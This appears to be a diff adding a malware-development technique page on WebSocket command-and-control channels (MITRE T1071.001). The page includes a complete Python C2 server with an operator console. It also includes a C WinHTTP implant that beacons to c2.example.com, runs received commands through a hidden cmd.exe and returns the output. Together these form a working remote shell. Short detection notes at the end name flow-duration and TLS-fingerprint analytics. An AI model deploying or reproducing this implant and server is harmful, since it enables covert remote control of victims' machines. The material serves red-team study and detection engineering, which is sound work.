@@ -1,0 +1,256 @@
+---
+title: WebSocket C2 Channel
+mitre: T1071.001
+category: c2
+group: Covert Channels
+summary: Use persistent WebSocket connections over HTTPS to maintain a full-duplex C2 channel that blends with web application traffic.
+platform: [Windows, Linux, macOS]
+tags: ['C / C++', 'Python', 'WinHTTP', 'WebSocket']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: 'HTTP Upgrade request (GET + Upgrade: websocket)'
+    desc: The implant sends a standard HTTP/1.1 upgrade request; the server responds with 101 Switching Protocols.
+    dll: winhttp / libwebsockets
+  - call: 'WebSocket handshake (Sec-WebSocket-Key)'
+    desc: Client generates a random 16-byte key, base64-encodes it; server validates and responds with Sec-WebSocket-Accept.
+    dll: —
+  - call: persistent full-duplex frame exchange
+    desc: Both ends can send frames at any time — no polling required. Server pushes tasks; implant pushes results.
+    dll: winhttp
+  - call: jitter keep-alive (PING frames)
+    desc: WebSocket PING/PONG keeps the connection alive through NAT and firewalls; jitter the interval to avoid fixed timing.
+    dll: —
+detections:
+  - src: NETWORK
+    text: Long-lived HTTPS connection (hours to days) to a single destination — legitimate WebSocket sessions are typically short-lived.
+  - src: NETWORK
+    text: WebSocket frames with high entropy payload — legitimate web apps use structured JSON/binary formats, not encrypted blobs.
+  - src: PROXY LOG
+    text: HTTP Upgrade to WebSocket at an unusual time of day or to a newly registered domain.
+  - src: BEHAVIOURAL
+    text: A process maintaining a persistent outbound WebSocket connection with no corresponding user interface activity.
+related:
+  - mitre: T1071.001
+    title: HTTP Beaconing
+    desc: Polling-based alternative — more detectable due to periodic connection pattern.
+    href: /techniques/c2/http-beaconing
+  - mitre: T1090.004
+    title: HTTPS Domain Fronting
+    desc: Route the WebSocket upgrade through a CDN front domain for network-level evasion.
+    href: /techniques/c2/https-domain-fronting
+  - mitre: T1095
+    title: ICMP Tunneling
+    desc: Layer-3 alternative when HTTP/S is unavailable.
+    href: /techniques/c2/icmp-tunneling
+labKit:
+  - label: ws-c2.py (server)
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Standard HTTP beaconing is **half-duplex and polling-based**: the implant connects, sends a check-in, reads a response, disconnects, waits, and repeats. Every polling interval is a detectable timing signature. WebSockets solve this with a persistent, full-duplex connection: once the upgrade handshake completes, both the implant and the server can send messages at any time.
+
+From a network detection standpoint, WebSocket traffic over HTTPS (WSS) looks like a long-lived HTTPS connection — after the upgrade, all frames are TLS-encrypted and indistinguishable from HTTPS data. Proxies that inspect HTTP headers will see the `Upgrade: websocket` header but typically pass it through for web application compatibility.
+
+The practical advantage for C2 is **low latency**: the operator can push a task and receive the result within milliseconds rather than waiting for the next beacon interval. This is the model used by Sliver's WireGuard C2 variant and custom C2 frameworks targeting environments with interactive operator requirements.
+
+<Callout type="note">
+  Persistent WebSocket connections are anomalous for most corporate endpoints. A workstation
+  maintaining a WSS connection for hours is unusual — legitimate WebSocket usage (web apps,
+  real-time dashboards) typically lasts minutes, not hours. This makes long-lived WebSocket C2
+  more detectable by flow-duration analytics than standard HTTP beaconing with realistic jitter.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### C2 server (Python asyncio + websockets)
+
+<CodeBlock
+  file="ws_server.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`import asyncio, json, ssl, websockets, base64, os
+
+CLIENTS = {}  # beacon_id -> websocket
+
+async def handle_beacon(ws, path):
+    beacon_id = ws.request_headers.get('X-Beacon-Id', os.urandom(4).hex())
+    CLIENTS[beacon_id] = ws
+    print(f"[+] Beacon connected: {beacon_id} from {ws.remote_address}")
+
+    try:
+        async for msg in ws:
+            data = json.loads(msg)
+            print(f"[{beacon_id}] Result: {data.get('output', '')[:200]}")
+
+    except websockets.ConnectionClosed:
+        print(f"[-] Beacon disconnected: {beacon_id}")
+    finally:
+        CLIENTS.pop(beacon_id, None)
+
+async def operator_shell():
+    while True:
+        cmd = await asyncio.get_event_loop().run_in_executor(None, input, "C2> ")
+        parts = cmd.strip().split(None, 1)
+        if len(parts) < 2:
+            print(f"Beacons: {list(CLIENTS.keys())}")
+            continue
+        bid, task = parts[0], parts[1]
+        if bid in CLIENTS:
+            await CLIENTS[bid].send(json.dumps({'cmd': task}))
+        else:
+            print(f"Unknown beacon: {bid}")
+
+async def main():
+    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    ssl_ctx.load_cert_chain("server.pem", "server.key")
+
+    async with websockets.serve(handle_beacon, "0.0.0.0", 443, ssl=ssl_ctx):
+        print("[*] WS C2 listening on wss://0.0.0.0:443")
+        await operator_shell()
+
+asyncio.run(main())`}
+/>
+
+### Implant side (C, WinHTTP WebSocket API)
+
+<CodeBlock
+  file="ws_beacon.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+#include <winhttp.h>
+#pragma comment(lib, "winhttp.lib")
+
+#define C2_HOST  L"c2.example.com"
+#define C2_PORT  443
+#define C2_PATH  L"/ws"
+
+// Execute a shell command and return output
+static char *run_cmd(const char *cmd) {
+    char full[512];
+    snprintf(full, sizeof full, "cmd.exe /c %s 2>&1", cmd);
+
+    SECURITY_ATTRIBUTES sa = { .nLength = sizeof sa, .bInheritHandle = TRUE };
+    HANDLE r, w;
+    CreatePipe(&r, &w, &sa, 0);
+    SetHandleInformation(r, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOA si = { .cb = sizeof si, .hStdOutput = w,
+                        .hStdError = w, .dwFlags = STARTF_USESTDHANDLES };
+    PROCESS_INFORMATION pi = {0};
+    CreateProcessA(NULL, full, NULL, NULL, TRUE,
+        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    CloseHandle(w);
+    WaitForSingleObject(pi.hProcess, 10000);
+
+    char *out = calloc(1, 65536);
+    DWORD rd;
+    ReadFile(r, out, 65535, &rd, NULL);
+    CloseHandle(r);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return out;
+}
+
+void ws_beacon_loop(void) {
+    HINTERNET session = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
+
+    HINTERNET conn = WinHttpConnect(session, C2_HOST, C2_PORT, 0);
+
+    // Request the WebSocket upgrade
+    HINTERNET req = WinHttpOpenRequest(conn, L"GET", C2_PATH,
+        NULL, WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);
+
+    WinHttpSetOption(req, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);
+    WinHttpAddRequestHeaders(req,
+        L"X-Beacon-Id: implant-001", (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
+
+    WinHttpSendRequest(req, NULL, 0, NULL, 0, 0, 0);
+    WinHttpReceiveResponse(req, NULL);
+
+    // Upgrade to WebSocket
+    HINTERNET ws = WinHttpWebSocketCompleteUpgrade(req, 0);
+    WinHttpCloseHandle(req);
+
+    BYTE buf[65536];
+    DWORD received;
+    WINHTTP_WEB_SOCKET_BUFFER_TYPE buf_type;
+
+    while (TRUE) {
+        // Receive a task from the operator
+        DWORD err = WinHttpWebSocketReceive(ws, buf, sizeof buf - 1,
+            &received, &buf_type);
+        if (err != NO_ERROR) break;
+
+        if (buf_type == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) {
+            buf[received] = 0;
+            // Parse JSON: {"cmd": "whoami"}
+            char *cmd_start = strstr((char*)buf, "\"cmd\": \"");
+            if (cmd_start) {
+                cmd_start += 8;
+                char *cmd_end = strchr(cmd_start, '"');
+                if (cmd_end) *cmd_end = 0;
+
+                char *output = run_cmd(cmd_start);
+
+                // Send result back
+                char result[65536 + 128];
+                snprintf(result, sizeof result,
+                    "{\"output\": \"%s\"}", output);
+                WinHttpWebSocketSend(ws,
+                    WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
+                    (PVOID)result, (DWORD)strlen(result));
+                free(output);
+            }
+        }
+    }
+
+    WinHttpWebSocketClose(ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
+    WinHttpCloseHandle(ws);
+    WinHttpCloseHandle(conn);
+    WinHttpCloseHandle(session);
+}`}
+/>
+
+## Comparison with HTTP beaconing
+
+| Property | HTTP polling | WebSocket |
+|---|---|---|
+| Latency | 1× beacon interval | Near-zero |
+| Connection duration | Short (seconds) | Long (hours/days) |
+| Detectable pattern | Fixed-period connections | Single long-lived connection |
+| Proxy traversal | Universal | Requires HTTP Upgrade support |
+| TLS inspection reveals | Periodic requests | Single upgrade + opaque frames |
+| Traffic volume | Constant (periodic) | Burst on task |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+Flow duration analytics are the primary detection lever. Alert on HTTPS connections exceeding 30 minutes from endpoints. Combine with the JA3/JA3S fingerprint of the TLS handshake — custom C2 clients often have distinctive TLS configurations that differ from major browser fingerprints.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
